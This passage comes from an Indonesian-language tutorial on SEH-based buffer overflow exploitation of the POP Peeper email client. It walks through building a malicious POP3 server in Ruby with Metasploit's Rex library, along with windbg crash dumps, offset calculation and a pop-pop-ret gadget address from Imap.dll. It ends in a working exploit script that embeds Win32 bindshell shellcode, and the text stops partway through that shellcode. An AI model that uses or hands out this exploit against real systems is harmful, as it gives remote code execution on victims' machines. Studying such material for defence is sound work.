+Poin ketiga, operasi dalam stack menggunakan "pop" dan "push". POP akan
+mengeluarkan isi stack yang paling atas (yang ditunjuk oleh ESP), dan kemudian
+ESP akan menunjuk isi selanjutnya dalam stack. Operasi POP akan mengeluarkan
+isi stack sebesar 4 bytes (32 bit) yang umumnya akan diletakan pada general
+register (EAX, EBX, ECX, dll). Jika sebelumnya ESP menunjuk lokasi 0x44444440,
+maka setelah operasi POP nilai ESP akan menunjuk pada lokasi 0x44444444, atau
+sering disebut ESP+4.
+
+Kembali pada ilustrasi diatas dimana "Next Pointer to SEH" berlokasi di ESP+8
+(hasil prolog SE Handler), maka ketika SE Handler dieksekusi (akibat dari
+access violation) oleh EIP dan ditemukan opcode misalnya: "pop eax, pop esi,
+ret", akan berakibat ESP menunjuk pada lokasi "Next Pointer to SEH" (pop eax,
+pop esi) dan EIP juga akan menunjuk lokasi "Next Pointer to SEH" (ret).
+Sekedar tambahan, opcode "ret" akan mengakibatkan nilai register ESP di-copy
+kedalam EIP.
+
+Sehingga kita akan mudah mengambil kesimpulan bahwa jika kita bisa
+mengendalikan isi SE Handler untuk menunjuk lokasi opcode "pop, pop, ret" dan
+mengendalikan isi Next Pointer to SEH untuk menunjuk lokasi shellcode, maka
+ketika access violation terjadi alur program akan diarahkan menuju shellcode.
+
+Tambahan lain adalah mengenai windows trampoline. Dunia windows berbeda dengan
+dunia linux, kita tidak bisa begitu saja memberikan opcode seperti "pop eax,
+pop esi, ret" pada EIP untuk kemudian di eksekusi oleh windows. Dalam windows
+kita menggunakan semacam trampoline, jadi kita harus menemukan lokasi memory
+yang memuat opcode "pop eax, pop esi, ret" tersebut dan memasukan lokasi
+memory yang memuat opcode itu untuk meng-overwrite "SE Handler".
+
+
+--[6]-- Vuln & Exploit
+
+Pada bagian ini kita akan melihat secara langsung bagaimana memanfaatkan SEH
+based exploit untuk menyerang hole pada salah satu aplikasi yang berjalan
+diatas Microsoft Windows. Aplikasi ini merupakan pop3 client, sehingga hasil
+akhir dari eksploitasinya merupakan RCE (Remote Code Execution) exploit.
+Exploitnya sendiri sudah beredar di internet sejak lama, namun yang paling
+utama saat ini adalah menunjukan bagaimana SEH based exploit bekerja.
+
+Advisories dan exploit untuk poppeeper pertama kali dirilis untuk publik oleh
+krakow labs[6]. Dalam advisories nya terdapat penjelasan mengenai bagaimana
+membuat client tersebut crash:
+
+"To trigger this vulnerability, POP Peeper has to connect to an exploitation
+server acting as a POP3 daemon. 
+POP Peeper then uses the UIDL command to get unique IDs for each email it
+later plans on retrieving. 
+The exploitation server can send an oversized ID (1040 bytes), overflowing a
+buffer on the stack, giving the attacker 
+complete control over the process.
+
+POP Peeper 3.4.0.0 was confirmed vulnerable. All versions of below 3.4.0.0 and
+are suspected vulnerable as well."
+
+Berdasarkan adv tersebut, POP Peeper yang merupakan pop3 client akan crash
+jika menerima inputan ID email yang akan di-retrieved dari server dengan
+ukuran yang melebihi kapasitas, dalam adv tersebut disebutkan kapasitas yang
+dimaksud sebesar 1040 bytes. Untuk itu maka kita akan menjalankan poppeeper
+(tentu saja versi < 3.4.0.0 :) pada sistem operasi Microsoft Windows, dan
+membuat aplikasi server sederhana yang akan melayani servis pop3 dan
+mengirimkan 'oversized ID' tersebut kepada POP Peeper.
+
+Saya banyak memanfaatkan fitur 'framework' dari Metasploit Framework ketika
+berhubungan dengan proses eksploitasi, terutama ketika targetnya adalah sistem
+operasi Microsoft Windows. Fitur framework disini berarti memanfaatkan
+library-library yang sudah disediakan oleh Metasploit Framework untuk
+mengembangkan exploit. Metasploit Framework memiliki library 'Rex' dimana
+didalamnya terdapat cukup banyak fungsi yang sangat bermanfaat bagi
+pengembangan exploit.
+
+Berikut ini contoh code yang dapat digunakan untuk membuat poppeeper crash
+dengan memanfaatkan Metasploit Framework:
+
+
+k-elektronik: /Applications/Metasploit/bug$ cat poppeeper_crash.rb
+#!/usr/bin/env ruby
+
+msfbase = '/Applications/Metasploit/lib'
+$:.unshift(msfbase)
+
+require 'rex'
+
+# define server parameter
+server_param = { 'LocalPort' => '1337' }
+# create the server
+sock = Rex::Socket::TcpServer.create(server_param)
+chld = sock.accept
+
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK 1 100\r\n")
+chld.get_once
+overflow = "A" * 2000
+chld.put("+OK\r\n1 " + overflow + "\r\n.\r\n")
+sock.close
+
+
+Jika dijalankan, program diatas akan menggunakan 'Rex' library metasploit
+untuk membuat tcp server yang membuka port 1337. Saat ada koneksi dari client
+(pop3 client, tentu saja hasil analisis dari fungsi 'check-mail' nya POP
+peeper dengan menggunakan tools seperti ethereal) maka tcp server akan
+melayani dengan menjawab layaknya server normal, namun pada saat memberikan ID
+email kepada POP Peeper maka dikirimkan ID dengan kapasitas besar (dalam hal
+ini sebesar 2000 bytes). 
+
+Aplikasi POP Peeper ketika menghubungi server diatas akan crash, namun tidak
+menunjukan pemberitahuan apapun. Ini adalah bukti bahwa SEH mengambil alih
+ketika crash (Access Violation) terjadi sehingga aplikasi akan langsung
+di-terminate oleh sistem operasi. Untuk itu kita membutuhkan debugger yang di
+attach pada proses POP Peeper untuk menganalisis kondisi aplikasi ketika crash
+terjadi. Berikut ini informasi dari debugger (windbg) sesaat ketika access
+violation terjadi:
+
+
+0:002> g
+(818.ac8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00e6f588 ebx=41414141 ecx=00e6f590 edx=00e6f5ac esi=00e6f5c4 edi=00b09370
+eip=0040ef07 esp=00e6f570 ebp=00e6f578 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** WARNING: Unable to verify checksum for C:\Program Files\POP
+Peeper\POPPeeper.exe
+*** ERROR: Module load completed but symbols could not be loaded for
+C:\Program Files\POP Peeper\POPPeeper.exe
+POPPeeper+0xef07:
+0040ef07 8b4b04          mov     ecx,dword ptr [ebx+4]
+ds:0023:41414145=????????
+
+
+Kita bisa melihat bahwa register EIP telah di-overwrite. EIP tersebut mungkin
+merupakan "Saved EIP" / RET suatu thread dari fungsi yang meng-handle ID email
+dari pop3 server dalam aplikasi POP Peeper. "Saved EIP" / RET tersebut
+di-overwrite oleh nilai suatu variable dalam fungsi yang tidak melakukan
+proses checking dengan baik sehingga ketika thread tadi selesai dan nilai
+"Saved EIP" / RET dari fungsi sebelumnya akan dikembalikan, nilainya telah
+di-overwrite oleh karakter overflow (bisa dilihat dari kemunculan 41414145
+diatas). Dalam kasus plain / native buffer overflow, kita akan berusaha
+meng-overwrite nilai RET tersebut untuk mengontrol jalannya aplikasi menuju
+shellcode yang diinginkan. Namun dalam hal ini, kita akan mencoba untuk
+memanfaatkan SEH dalam proses eksploitasi POP Peeper.
+
+Dari informasi windbg diatas, kita dapat melihat ketika exception terjadi
+"Access Violation - code c0000005 (first chance)", maka windbg menangkap event
+tersebut dan menunjukan kondisi general register sesaat setelah exception
+terjadi. Dalam hal ini, exception handling belum dilakukan. Singkat kata,
+Microsoft Windows mengetahui bahwa terjadi exception violation pada aplikasi
+POP Peeper dan memberitahu debugger untuk dianalisis dengan menyertakan
+beragam info. Kita akan mencari tahu apakah ketika exception terjadi dan
+dengan jumlah buffer sebesar 2000 bytes tersebut struktur SEH dalam stack juga
+ikut di-overwrite:
+
+
+0:002> !exchain
+00e6f5cc: POPPeeper+d76b9 (004d76b9)
+00e6fa1c: 41414141
+Invalid exception stack at 41414141
+
+
+Binggo!
+
+Ternyata karakter yang kita kirimkan kepada POP Peeper sebesar 2000 bytes juga
+meng-overwrite struktur SEH dalam stack. Berikutnya kita akan membiarkan
+Microsoft Windows membawa aplikasi POP Peeper yang crash menuju SEH, dan
+berhubung dari !exchain diatas kita mendapatkan info bahwa nilai SEH telah
+di-overwrite oleh 41414141 maka kita akan lihat apakah nilai EIP akan menuju
+lokasi 41414141 ketika Microsoft Windows meng-eksekusi SEH:
+
+
+0:002> g
+(818.ac8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=41414141 edx=7c9032bc esi=00000000 edi=00000000
+eip=41414141 esp=00e6f1a0 ebp=00e6f1c0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+41414141 ??              ???
+
+
+Perfect!
+
+EIP berisi 41414141 yang berarti SEH telah dieksekusi. Kita mengetahui bahwa
+dari 2000 bytes buffer yang dikirimkan tersebut, ada 4 bytes yang telah
+meng-overwrite nilai SEH dalam stack, namun kita belum mengetahui karakter
+ke-berapa kah yang meng-overwrite SEH. Untuk itu akan digunakan fitur lain
+dari Metasploit Framework untuk mengirimkan karakter unik sejumlah 2000 bytes
+kepada POP Peeper dan kemudian menganalisis karakter pada offset keberapakah
+yang meng-overwrite SEH. Sedikit modifikasi dari poppeeper_crash.rb:
+
+
+k-elektronik: /Applications/Metasploit/bug$ cat poppeeper_crash.rb
+#!/usr/bin/env ruby
+
+msfbase = '/Applications/Metasploit/lib'
+$:.unshift(msfbase)
+
+require 'rex'
+
+# define server parameter
+server_param = { 'LocalPort' => '1337' }
+# create the server
+sock = Rex::Socket::TcpServer.create(server_param)
+chld = sock.accept
+
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK 1 100\r\n")
+chld.get_once
+overflow = Rex::Text.pattern_create(2000)
+chld.put("+OK\r\n1 " + overflow + "\r\n.\r\n")
+sock.close
+
+
+Tambahan "overflow = Rex::Text.pattern_create(2000)" akan membuat tcp server
+yang sebelumnya mengirimkan deretan karakter 'A' diganti dengan deretan
+karakter unik dengan memanfaatkan library 'Rex' metasploit.
+
+
+0:002> g
+(cf8.924): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00e6f588 ebx=6c42336c ecx=00e6f590 edx=00e6f5ac esi=00e6f5c4 edi=00b09370
+eip=0040ef07 esp=00e6f570 ebp=00e6f578 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** WARNING: Unable to verify checksum for C:\Program Files\POP
+Peeper\POPPeeper.exe
+*** ERROR: Module load completed but symbols could not be loaded for
+C:\Program Files\POP Peeper\POPPeeper.exe
+POPPeeper+0xef07:
+0040ef07 8b4b04          mov     ecx,dword ptr [ebx+4]
+ds:0023:6c423370=????????
+0:002> !exchain
+00e6f5cc: POPPeeper+d76b9 (004d76b9)
+00e6fa1c: 396a4238
+Invalid exception stack at 6a42376a
+
+
+Kita dapat melihat bahwa SEH di-overwrite oleh nilai (hexa) '396a4238'. Mesin
+yang saya gunakan adalah 'intel based' yang berarti little-endian, sehingga
+kita akan meng-convert nilai hexa '38426a39' kedalam ascii menjadi '8Bj9'.
+Dengan tools 'pattern_offset.rb' bawaan Metasploit kita akan mencari pada
+offset keberapakah posisi '8Bj9' tersebut jika overflow yang digunakan
+sebanyak 2000 bytes:
+
+
+Metasploit/tools$ ./pattern_offset.rb 8Bj9 2000
+1076
+
+
+Artinya karakter yang akan meng-overwrite nilai SEH ketika overflow terjadi
+terletak pada offset 1076. Metasploit Framework juga memiliki plugin yang
+disebut 'byakugan', dengan menggunakan plugin ini yang di integrasikan kedalam
+windbg maka kita akan mendapatkan posisi offset tersebut secara cepat:
+
+
+0:002> g
+(cf8.924): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=396a4238 edx=7c9032bc esi=00000000 edi=00000000
+eip=396a4238 esp=00e6f1a0 ebp=00e6f1c0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+396a4238 ??              ???
+0:002> !load byakugan
+[Byakugan] Successfully loaded!
+0:002> !pattern_offset 2000
+[Byakugan] Control of ecx at offset 1076.
+[Byakugan] Control of eip at offset 1076.
+
+
+Dengan byakugan kita cukup berinteraksi melalui windbg untuk mendapatkan
+offset yang meng-overwrite EIP ketika SEH dieksekusi. Kelemahannya adalah
+"!pattern_offset" tersebut hanya dapat menganalisis general register, sehingga
+baru akan diketahui setelah SEH dieksekusi.
+
+Oke, sekarang kita sudah memiliki info bahwa SEH akan di-overwrite oleh
+karakter offset 1076 dalam overflow dan Next SEH pada offset 1072. Mengapa
+berbeda dengan penjelasan dari krakow labs dalam advisoriesnya?hal ini kembali
+lagi kepada karakteristik Microsoft Windows. Setiap ada update (baik service
+pack maupun update biasa), ataupun perbedaan language pack akan berpengaruh
+terhadap posisi buffer dan pergerakan stack. Hal ini akan berpengaruh kepada
+masalah reliable suatu exploit, untuk itulah analisis dan uji coba sangat
+dibutuhkan dalam menentukan tingkat reliable suatu exploit.
+
+Kembali pada topik POP Peeper, sesuai dengan teori sebelumnya bahwa kita akan
+meng-overwrite nilai SEH dalam stack dengan lokasi memory "pop+pop+ret" serta
+meng-overwrite nilai Next SEH dengan lokasi shellcode. Namun sebelumnya akan
+lebih baik jika kita bisa memastikan apakah kita bisa meng-overwrite nilai SEH
+dan Next SEH menggunakan offset 1076 tersebut. Berikut modifikasi dari
+"poppeeper_crash.rb":
+
+
+k-elektronik: /Applications/Metasploit/bug$ cat poppeeper_crash.rb
+#!/usr/bin/env ruby
+
+msfbase = '/Applications/Metasploit/lib'
+$:.unshift(msfbase)
+
+require 'rex'
+
+# define server parameter
+server_param = { 'LocalPort' => '1337' }
+# create the server
+sock = Rex::Socket::TcpServer.create(server_param)
+chld = sock.accept
+
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK 1 100\r\n")
+chld.get_once
+overflow = "A" * 1072
+trash = "D" * 1000
+seh = "BBBB"
+nseh = "CCCC"
+chld.put("+OK\r\n1 " + overflow + nseh + seh + trash + "\r\n.\r\n")
+sock.close
+
+
+Kita akan mengirimkan 1072 karakter "A", kemudian dilanjutkan dengan "CCCC"
+untuk meng-overwrite Next SEH, dan "BBBB" untuk meng-overwrite SEH. Berikut
+hasilnya:
+
+
+0:002> !exchain
+00e6f5cc: POPPeeper+d76b9 (004d76b9)
+00e6fa1c: 42424242
+Invalid exception stack at 43434343
+
+
+Setelah mendapatkan offset yang dapat digunakan untuk meng-overwrite nilai SEH
+dan Next SEH, yang tersisa adalah prinsip "trampoline". Kita tidak bisa begitu
+saja memasukan opcode "pop+pop+ret" untuk meng-overwrite SEH, namun kita harus
+mencari lokasi memory yang memiliki opcode dengan pattern "pop+pop+ret".
+Secara teori kita dapat menggunakan library apapun yang di-load oleh Microsoft
+Windows ketika aplikasi dijalankan (mis: kernel32.dll, ntdll.dll, user32.dll,
+dsb). Namun cara terbaik untuk membuat exploit windows reliable adalah mencari
+opcode tersebut dari library yang di-load oleh aplikasi ketika di jalankan.
+Alasannya adalah library tersebut bersifat statis, sehingga lokasi library
+pada memory ketika di-load oleh beragam sistem operasi Microsoft Windows akan
+sama. Aplikasi POP Peeper memiliki 2 library sendiri yang akan di-load ketika
+aplikasi tersebut dijalankan:
+
+ModLoad: 10000000 10021000   C:\Program Files\POP Peeper\Imap.dll
+ModLoad: 00cc0000 00d62000   C:\Program Files\POP Peeper\SendMail.dll
+
+Kita akan kembali menggunakan tools metasploit yang disebut "msfpescan":
+
+
+$ ./msfpescan --poppopret bug/Imap.dll 
+[bug/Imap.dll]
+0x100036f2 pop esi; pop ebp; retn 0x0008
+0x10003905 pop ebx; pop ebp; retn 0x0008
+0x1000393a pop edi; pop ebp; retn 0x0004
+0x10003994 pop ebx; pop ebp; retn 0x0004
+...
+...
+0x1001514c pop edi; pop esi; ret
+0x10015cdd pop ecx; pop ecx; ret
+0x10015cf5 pop ecx; pop ecx; ret
+0x10015d0d pop ecx; pop ecx; ret
+0x10015d25 pop ecx; pop ecx; ret
+0x10015ec0 pop ecx; pop ecx; ret
+0x10015ee2 pop ecx; pop ecx; ret
+0x10016045 pop ecx; pop ecx; ret
+0x10016081 pop ecx; pop ecx; ret
+
+
+ada banyak pilihan, dan untuk kali ini saya akan memilih lokasi memory
+0x1001514c untuk meng-overwrite SEH:
+
+
+0:002> u 1001514c
+*** WARNING: Unable to verify checksum for C:\Program Files\POP
+Peeper\Imap.dll
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for
+C:\Program Files\POP Peeper\Imap.dll - 
+Imap!PPProt_CreateProt+0xcd89:
+1001514c 5f              pop     edi
+1001514d 5e              pop     esi
+1001514e c3              ret
+
+
+Selanjutnya yang menarik adalah menentukan lokasi shellcode untuk kemudian
+digunakan saat meng-overwrite nilai Next SEH. Sebelumnya kita harus terlebih
+dahulu mempersiapkan shellcode yang akan digunakan, terutama mengetahui berapa
+besar shellcode tersebut. Kemudian menentukan bagaimana memasukan shellcode
+tersebut dalam deretan karakter yang akan digunakan saat meng-overflow POP
+Peeper.
+
+Cara paling mudah dan paling umum adalah meletakan setelah posisi Next SEH dan
+SEH. Jika ruang yang tersedia cukup besar, maka kita tinggal menambahkan NOP
+Sled (agar exploit lebih reliable) dan shellcode seperti berikut ini:
+
+
+                     +--------------+
+                     |              |
+                     v              |
+[   junk    ] + [ Next SEH ] + [ SEH     ] + [ NOP Sled   ] + [ Shell Code ] 
+| 1072 bytes|   | 4 bytes  |   | 4 bytes |   | 50 bytes   |   | 709 bytes  |
+                | jmp 30   |   |poppopret|         ^
+                     |                             |
+                     +-----------------------------+
+
+|------------------------- Overflow ---------------------------------------|
+
+
+1. Deretan karakter overflow akan menyebabkan terjadinya Access Violation
+2. Eksekusi akan dibawa menuju SEH yang isi nya telah di-overwrite dengan
+lokasi opcode "pop pop ret"
+3. Opcode "pop pop ret" akan membawa eksekusi menuju Next SEH
+4. Next SEH berisi opcode "jump 30 bytes"
+5. Hasil eksekusi jump akan sampai pada deretan NOP Sled yang selanjutnya akan
+mengesekusi 20 bytes NOP menuju Shell Code
+6. Shell Code di-eksekusi dan Game Over :)
+
+Jika dikarenakan suatu kondisi ruang untuk shellcode sangat terbatas, maka
+bisa dibuat multi-staged shellcode yang membuat eksekusi shellcode awal
+mengarahkan eksekusi ke daerah junk. Dan shellcode yang sebenarnya diberikan
+dalam area junk (1072 bytes cukup untuk beragam hal :), namun untuk pembahasan
+kali ini akan menggunakan tehnik umum sebagai tujuan menunjukan dasar SEH
+based exploit.
+
+Berikut ini hasil dump isi memory dari poppeeper_crash.rb:
+
+
+0:002> !exchain
+00e6f1b4: ntdll!ExecuteHandler2+3a (7c9032bc)
+00e6f5cc: POPPeeper+d76b9 (004d76b9)
+00e6fa1c: 42424242
+Invalid exception stack at 43434343
+0:002> d 00e6fa1c
+00e6fa1c  43 43 43 43 42 42 42 42-44 44 44 44 44 44 44 44  CCCCBBBBDDDDDDDD
+00e6fa2c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa3c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa4c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa5c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa6c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa7c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa8c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+
+
+Terlihat jelas bagaimana SEH dan Next SEH di-overwrite serta posisi dari
+'trash' membanjiri memory. Untuk lebih memperjelas maka kita akan modifikasi
+sedikit lagi poppeeper_crash.rb menjadi seperti berikut ini:
+
+
+k-elektronik: /Applications/Metasploit/bug$ cat poppeeper_crash.rb
+#!/usr/bin/env ruby
+
+msfbase = '/Applications/Metasploit/lib'
+$:.unshift(msfbase)
+
+require 'rex'
+
+# define server parameter
+server_param = { 'LocalPort' => '1337' }
+# create the server
+sock = Rex::Socket::TcpServer.create(server_param)
+chld = sock.accept
+
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK 1 100\r\n")
+chld.get_once
+
+junk = "A" * 1072
+seh = "\x4c\x51\x01\x10"  # pop,pop,ret from imap.dll
+nseh = "\x90\x90\xeb\x1e" # jump 30 bytes forward
+nop = "\x90" * 50
+shellcode = "\xcc\xcc\xcc\xcc" + "D" * 500  # interrupt plus shellcode
+chld.put("+OK\r\n1 " + junk + nseh + seh + nop + shellcode + "\r\n.\r\n")
+sock.close
+
+
+Berikut ini hasil susunan memory-nya ketika dieksekusi:
+
+
+0:002> g
+(958.a18): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00e6f588 ebx=90909090 ecx=00e6f590 edx=00e6f5ac esi=00e6f5c4 edi=00b09370
+eip=0040ef07 esp=00e6f570 ebp=00e6f578 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** WARNING: Unable to verify checksum for C:\Program Files\POP
+Peeper\POPPeeper.exe
+*** ERROR: Module load completed but symbols could not be loaded for
+C:\Program Files\POP Peeper\POPPeeper.exe
+POPPeeper+0xef07:
+0040ef07 8b4b04          mov     ecx,dword ptr [ebx+4]
+ds:0023:90909094=????????
+0:002> !exchain
+00e6f5cc: POPPeeper+d76b9 (004d76b9)
+00e6fa1c: *** WARNING: Unable to verify checksum for C:\Program Files\POP
+Peeper\Imap.dll
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for
+C:\Program Files\POP Peeper\Imap.dll - 
+Imap!PPProt_CreateProt+cd89 (1001514c)
+Invalid exception stack at 1eeb9090
+0:002> g
+(958.a18): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=00000000 ecx=1001514c edx=7c9032bc esi=00e6f288 edi=7c9032a8
+eip=00e6fa56 esp=00e6f1ac ebp=00e6f1c0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+00e6fa56 cc              int     3
+0:002> d 00e6fa1c
+00e6fa1c  90 90 eb 1e 4c 51 01 10-90 90 90 90 90 90 90 90  ....LQ..........
+00e6fa2c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+00e6fa3c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+00e6fa4c  90 90 90 90 90 90 90 90-90 90 cc cc cc cc 44 44  ..............DD
+00e6fa5c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa6c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa7c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa8c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+0:002> d eip
+00e6fa56  cc cc cc cc 44 44 44 44-44 44 44 44 44 44 44 44  ....DDDDDDDDDDDD
+00e6fa66  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa76  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa86  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fa96  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6faa6  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fab6  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00e6fac6  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+
+
+Cukup jelas bukan?! Next SEH yang berlokasi di 0x00e6fa1c berisi opcode "jump
+30 bytes" ketika dieksekusi akan membawa menuju deretan NOP Sled, dari situ
+eksekusi meluncur menuju 0x00e6fa56 yang telah diset "interrupt 3". INT 3 akan
+membuat eksekusi berhenti dan diserahkan kepada debugger, dengan begitu kita
+dapat melihat bahwa EIP telah dapat dikontrol dengan baik. Selanjutnya tinggal
+menggantinya dengan shellcode dan permainan berakhir:
+
+
+k-elektronik: /Applications/Metasploit/bug$ cat poppeeper_crash.rb
+#!/usr/bin/env ruby
+
+msfbase = '/Applications/Metasploit/lib'
+$:.unshift(msfbase)
+
+require 'rex'
+
+# define server parameter
+server_param = { 'LocalPort' => '1337' }
+# create the server
+sock = Rex::Socket::TcpServer.create(server_param)
+chld = sock.accept
+
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK\r\n")
+chld.get_once
+chld.write("+OK 1 100\r\n")
+chld.get_once
+
+# Win32 Bindshell Shellcode - 709 bytes
+# http://www.metasploit.com
+# EXITFUNC=thread, LPORT=55555, Encoder= pexalphanum
+shellcode = 
+"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49" +
+"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36" +
+"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34" +
+"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41" +
+"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e" +
+"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x38" +
+"\x4e\x46\x46\x32\x46\x42\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x47" +
+"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x31\x4b\x38" +
+"\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x38" +
+"\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c" +
+"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e" +
+"\x46\x4f\x4b\x53\x46\x35\x46\x32\x4a\x42\x45\x57\x45\x4e\x4b\x48" +
+"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x30\x4b\x54" +
+"\x4b\x58\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x43\x50\x4e\x52\x4b\x58" +
+"\x49\x38\x4e\x56\x46\x52\x4e\x51\x41\x36\x43\x4c\x41\x43\x4b\x4d" +
+"\x46\x36\x4b\x58\x43\x54\x42\x53\x4b\x48\x42\x44\x4e\x30\x4b\x58" +
+"\x42\x57\x4e\x31\x4d\x4a\x4b\x38\x42\x54\x4a\x50\x50\x55\x4a\x46" +
+"\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x56" +
+"\x43\x35\x48\x36\x4a\x46\x43\x43\x44\x53\x4a\x46\x47\x47\x43\x37" +
+"\x44\x43\x4f\x55\x46\x55\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e" +
+"\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x35\x49\x58\x45\x4e" +
+"\x48\x36\x41\x58\x4d\x4e\x4a\x50\x44\x30\x45\x45\x4c\x46\x44\x30" +
+"\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55" +
+"\x4f\x4f\x48\x4d\x43\x55\x43\x45\x43\x55\x43\x35\x43\x35\x43\x34" +
+"\x43\x55\x43\x44\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x49\x4d" +
+"\x43\x30\x48\x36\x43\x55\x49\x38\x41\x4e\x45\x49\x4a\x46\x46\x4a" +
+"\x4c\x31\x42\x47\x47\x4c\x47\x55\x4f\x4f\x48\x4d\x4c\x36\x42\x41" +
+"\x41\x35\x45\x45\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42" +
+"\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x45\x4f\x4f\x42\x4d" +
+"\x4a\x36\x45\x4e\x49\x54\x48\x48\x49\x54\x47\x35\x4f\x4f\x48\x4d" +
+"\x42\x55\x46\x45\x46\x55\x45\x45\x4f\x4f\x42\x4d\x43\x59\x4a\x46" +
+"\x47\x4e\x49\x57\x48\x4c\x49\x37\x47\x55\x4f\x4f\x48\x4d\x45\x55" +
+"\x4f\x4f\x42\x4d\x48\x36\x4c\x46\x46\x46\x48\x56\x4a\x46\x43\x36" +
+"\x4d\x36\x49\x48\x45\x4e\x4c\x36\x42\x55\x49\x45\x49\x32\x4e\x4c" +
+"\x49\x48\x47\x4e\x4c\x36\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c" +
+"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x54\x4e\x32" +
